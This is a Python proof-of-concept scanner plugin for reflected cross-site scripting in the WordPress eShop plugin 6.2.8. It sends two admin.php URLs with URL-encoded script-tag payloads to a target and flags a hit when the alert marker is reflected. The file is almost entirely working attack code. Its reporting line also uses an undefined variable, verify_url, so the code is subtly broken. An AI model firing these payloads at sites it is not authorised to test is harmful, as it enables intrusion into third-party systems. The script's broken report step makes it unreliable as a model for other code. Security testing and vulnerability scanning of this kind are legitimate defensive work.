#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : WordPress eShop Plugin 6.2.8 Multiple Cross Site Scripting Vulnerabilities
From : http://www.exploit-db.com/exploits/36038/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payloads = ("wp-admin/admin.php?page=eshop-templates.php&eshoptemplate=%22%3E%3Cscript%3Ealert%28%2Fhello_topper%2f%29;%3C/script%3E",
"wp-admin/admin.php?page=eshop-orders.php&view=1&action=%22%3E%3Cscript%3Ealert%28%2Fhello_topper%2f%29;%3C/script%3E")
    for payload in payloads:
        target_url=arg + payload
        code, head, res, errcode, _ = curl.curl(target_url)
        if code == 200 and res.find('alert(/hello_topper/)') != -1:
            security_info(verify_url + 'Wordpress eShop Reflected XSS') 

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])